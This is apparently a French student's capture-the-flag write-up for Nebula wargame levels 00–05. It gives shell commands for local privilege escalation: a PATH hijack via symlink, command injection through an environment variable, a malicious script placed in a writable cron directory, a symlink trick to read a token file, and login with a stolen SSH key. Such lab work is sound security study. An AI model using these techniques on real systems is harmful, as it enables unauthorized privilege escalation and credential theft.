# tp1_secu

**Level00**

level00@nebula:/bin/...$ find / -user flag00 2>/dev/null trouve flag00 partout
Le programme change le UID effectif et permet d'éxecuter un programme pour lequel on devrait pas avoir la permission (getflag)

CWE250:
The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.


**Level01**

level01@nebula:/tmp$ ln -s /bin/getflag /tmp/echo on pointe echo vers le programme sensible en gardant le UID et GID. Quand echo sera appelé ça sera pas dans /usr/bin/env mais dans /bin/getflag

level01@nebula:/tmp$ export PATH=/tmp:$PATH on rajoute tmp dans le path pour que echo ait accès à notre redirection.

**Level02**

export USER='$(/bin/getflag)'

**Level03**
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
Le cron appartient à flag03 donc tout ce qui est executé par lui à les droits de flag03.

on crée le fichier malveillant: echo "/bin/getflag" > malveillance_max.sh
il faut rediriger la sortie pour être sur que la sortie soit pas envoyé par mail ou quoi.
level03@nebula:/home/flag03/writable.d$ echo -e '#!/bin/bash\n/bin/getflag > /tmp/flag03.txt 2>&1' > malveillance_max.sh

**Level04**
/home/flag04$ ln -s /home/flag04/token /tmp/lien_pas_suspect crée le faux lien ne contenant pas le mot token
06508b5e-8909-4f38-b630-fdb148a848a2 est le token de flag04
en se connectant sur flag04 on peut alors rensigner le mdp
sh-4.2$ id uid=995(flag04) gid=995(flag04) groups=995(flag04) on est bien flag04 et donc on peut executer getflag

**Level05**
Un fichier caché backup est présent:
level05@nebula:/home/flag05$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile  .ssh
Il y'a une archive dedans
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz
qui contient plusieurs fichier dont le plus important 
id_rsa dans .ssh qui permet de se connecter en ssh
level05@nebula:/tmp$ ssh -i /tmp/.ssh/id_rsa flag05@localhost

et donc avoir le bon id pour effectuer getflag




